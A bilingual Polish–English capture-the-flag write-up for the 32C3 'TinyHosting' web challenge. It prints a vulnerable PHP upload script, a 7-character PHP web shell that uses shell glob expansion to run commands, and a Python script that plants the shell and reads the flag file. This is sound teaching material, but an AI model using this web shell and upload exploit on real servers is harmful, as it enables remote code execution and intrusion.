## TinyHosting (web, 250p, 71 solves)

> A new file hosting service for very small files. could you pwn it?
> 
> http://136.243.194.53/

### PL
[ENG](#eng-version)

Pod http://136.243.194.53/ znajduje się formularz umożliwiający wysyłanie plików na serwer.

W kodzie HTML znajduje się komentarz:

    <!-- <a href="./?src=">src</a>-->

Po dodaniu do url `?src=1` możemy zobaczyć kod strony:

	<?php
		$savepath="files/".sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT'])."/";
		if(!is_dir($savepath)){
		    $oldmask = umask(0);
		    mkdir($savepath, 0777);
		    umask($oldmask);
		    touch($savepath."/index.html");
		}
		if((@$_POST['filename']) && (@$_POST['content']) ){
		    $fp = fopen("$savepath".$_POST['filename'], 'w');
		    fwrite($fp, substr($_POST['content'],0,7) );
		    fclose($fp);
		    $msg = 'File saved to <a>'.$savepath.htmlspecialchars($_POST['filename'])."</a>";
		}
	?>

Skrypt pozwala na tworzenie plików z rozszerzeniem .php. Treść jest jednak ucinana do 7 znaków. `<?php ?` generuje `Internal Server Error`.

Używająć krótkiego tagu startowego i pomijająć końcowy możemy wykonać jednoliterowe polecenie: `<?=\`*\`;`

Jeżeli stworzymy pliki o nazwach `bash` i `bash2`, `*` rozwinie się do `bash bash2 index.html`. Możemy w ten sposób wykonywać 7 znakowe skrypty shellowe:

	import requests
	import re

	url = "http://136.243.194.53/"
	user_agent = "xxx"

	t = requests.post(url, headers = {'User-agent': user_agent }, data = {"filename":"zzz.php", "content":"<?=`*`;"}).text
	[path] = re.findall('files.*/zzz.php', t)

	requests.post(url, headers = {'User-agent': user_agent }, data = {"filename":"bash", "content":'xxx'})
	requests.post(url, headers = {'User-agent': user_agent }, data = {"filename":"bash2", "content":'ls /'})
	r = requests.get(url+path)

	print r.text

W głównym katalogu znajduje się plik `file_you_want`. Możemy go pobrać poleceniem `cat /f*`. W pliku znajduje się flaga:

    32c3_Gr34T_Th1ng5_Are_D0ne_By_A_Ser13s_0f_5ma11_Th1ngs_Br0ught_T0ge7h3r

### ENG version

Under http://136.243.194.53/ there is a form which allows uploading files.

In page source there is a comment:

    <!-- <a href="./?src=">src</a>-->

After adding `?src=1` to the url php source is printed:

	<?php
		$savepath="files/".sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT'])."/";
		if(!is_dir($savepath)){
		    $oldmask = umask(0);
		    mkdir($savepath, 0777);
		    umask($oldmask);
		    touch($savepath."/index.html");
		}
		if((@$_POST['filename']) && (@$_POST['content']) ){
		    $fp = fopen("$savepath".$_POST['filename'], 'w');
		    fwrite($fp, substr($_POST['content'],0,7) );
		    fclose($fp);
		    $msg = 'File saved to <a>'.$savepath.htmlspecialchars($_POST['filename'])."</a>";
		}
	?>

Page doesn't block creating files with .php extension. The content is limited to 7 chars though. `<?php ?` generates `Internal Server Error`. 

By using short start tags and ommiting end tag it's possible to execute single char shell command:  ``<?=`*`;``

If we create two files: `bash` and `bash2`, `*` will expand to: `bash bash2 index.html`. This way we can execute 7 char shell scripts:

	import requests
	import re

	url = "http://136.243.194.53/"
	user_agent = "xxx"

	t = requests.post(url, headers = {'User-agent': user_agent }, data = {"filename":"zzz.php", "content":"<?=`*`;"}).text
	[path] = re.findall('files.*/zzz.php', t)

	requests.post(url, headers = {'User-agent': user_agent }, data = {"filename":"bash", "content":'xxx'})
	requests.post(url, headers = {'User-agent': user_agent }, data = {"filename":"bash2", "content":'ls /'})
	r = requests.get(url+path)

	print r.text

In root directory there is a file named `file_you_want`. We can get its contents with `cat /f*`. This file contains the flag:

    32c3_Gr34T_Th1ng5_Are_D0ne_By_A_Ser13s_0f_5ma11_Th1ngs_Br0ught_T0ge7h3r

